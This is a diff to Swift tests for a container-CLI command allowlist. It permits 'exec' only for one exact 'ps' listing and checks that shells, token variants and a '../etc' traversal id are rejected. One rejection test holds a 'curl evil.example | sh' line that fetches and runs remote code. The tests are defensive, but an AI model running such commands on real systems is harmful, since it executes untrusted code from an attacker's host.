@@ -267,6 +267,10 @@ private func requireRejected(
         "volume list", "volume inspect",
         "network list", "network inspect",
         "system status", "system version", "system df",
+        // `exec` is read-only because the ONLY command it permits is a `ps` — see
+        // TrailingPolicy.exact. If this ever moves to the mutating set, someone has widened
+        // what exec can run, and that needs a fresh security review, not a test update.
+        "exec",
     ]
     let actualReadOnly = Set(Allowlist.commands.filter { !$0.mutates }.map(\.name))
     #expect(actualReadOnly == expectedReadOnly)
@@ -350,6 +354,13 @@ private func requireRejected(
                     canonical: ["system", "status", "--format", "json"], mutates: false),
         AllowedCase(["system", "version"], mutates: false),
         AllowedCase(["system", "df", "--format", "table"], mutates: false),
+
+        // The separator is required on input but DROPPED from the canonical argv: the real
+        // `container exec` treats `--` as the program name and fails on it. Caught by running
+        // the CLI, not by a unit test, which is why the canonical form is pinned here.
+        AllowedCase(["exec", "web", "--", "ps", "-o", "pid,comm,args"],
+                    canonical: ["exec", "web", "ps", "-o", "pid,comm,args"],
+                    mutates: false, timeout: 15),
     ]
 
     #expect(cases.count == Allowlist.commands.count)
@@ -366,5 +377,60 @@ private func requireRejected(
         #expect(command.mutates == testCase.mutates)
         #expect(command.timeoutHint == testCase.timeout)
         #expect(command.auditDescription == (["container"] + testCase.canonical).joined(separator: " "))
+    }
+}
+
+// MARK: - exec is locked to one command
+//
+// The process list needs `container exec <id> ps`. Allowlisting `exec` at all is the risky
+// part: with `.command(maxTokens:)` it would also permit `exec <id> sh`, an interactive shell
+// inside the container — precisely the "generic remote shell" the transport decision rules
+// out, and far worse in Phase 2 where the caller is a remote peer. `TrailingPolicy.exact` is
+// what keeps the grant narrow, so these tests exist to stop anyone widening it by accident.
+
+@Test func execPermitsExactlyTheProcessListing() throws {
+    let validated = try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args"])
+    #expect(validated.subcommand == ["exec"])
+    #expect(validated.mutates == false)     // a ps changes nothing
+}
+
+@Test func execRefusesAShell() throws {
+    // The whole reason `.exact` exists.
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "sh"])
+    }
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "/bin/bash", "-c", "curl evil.example | sh"])
+    }
+}
+
+@Test func execRefusesAnythingButTheExactTokens() throws {
+    // A superset...
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args", "--forest"])
+    }
+    // ...a subset...
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "ps"])
+    }
+    // ...a reordering...
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "ps", "pid,comm,args", "-o"])
+    }
+    // ...a different ps format...
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args,uid"])
+    }
+    // ...and nothing at all.
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "web"])
+    }
+}
+
+@Test func execStillRequiresAValidContainerIdentifier() throws {
+    // The operand shape is unchanged by the trailing policy — a Unicode lookalike or a
+    // traversal in the id must still be rejected.
+    #expect(throws: (any Error).self) {
+        try Allowlist.validated(["exec", "../etc", "--", "ps", "-o", "pid,comm,args"])
     }
 }
